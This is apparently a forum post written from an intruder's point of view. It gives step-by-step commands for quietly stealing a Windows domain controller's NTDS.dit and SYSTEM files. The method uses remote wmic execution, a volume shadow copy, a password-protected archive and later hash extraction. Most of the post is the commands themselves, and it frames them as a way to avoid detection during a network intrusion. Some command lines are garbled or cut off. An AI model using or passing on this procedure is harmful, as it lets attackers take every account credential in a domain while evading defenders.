Cite

    ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv

5 sec and you get all hashes

What is the alternative that is SO much quieter?

Code: [Highlight].

shell wmic /node: "DC01" /user: "DOMAIN\admin" /password: "cleartextpass" process call create "cmd /c vssadmin list shadows >> c:\log.txt"


query the shaddy listings, there is a date, check if it is a recent date.
They're almost certainly already there. If not, you'll have to do it yourself.
Code: [Highlight]

net start Volume Shadow Copy
shell wmic /node: "DC01" /user: "DOMAIN\admin" /password: "cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"


then in the Shadow Copy listing find the most recent one
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
Correspondingly we need the shadow copy number for the following command
Code: [Highlight]

shell wmic /node: "DC01" /user: "DOMAIN\admin" /password: "cleartextpass" process call create "cmd /c copy \\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ & copy \\?\"GGLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\\?


ntds.dit / security / system files should fall into c:\temp\log\
take the portable console 7z and pack it in the archive with password
Code: [Highlight]

7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD


download the password-protected archive to yourself, if you get an error when you decrypt the ntds file (the file is corrupted), then do the following
Code: [Highlight]

Esentutl /p C:\log\ntds.dit


the trick of this method is that we do not actually dump anything, we just take and download the ntds
so we don't get caught pulling out the ntds we pack it in a password protected archive

If you have a problem with being burnt and kicked off the network after a ntds dump, try this method
it can be burned only by the fact of some leaked date from cd, and it is impossible to analyze what exactly you take without knowing the password from the archive
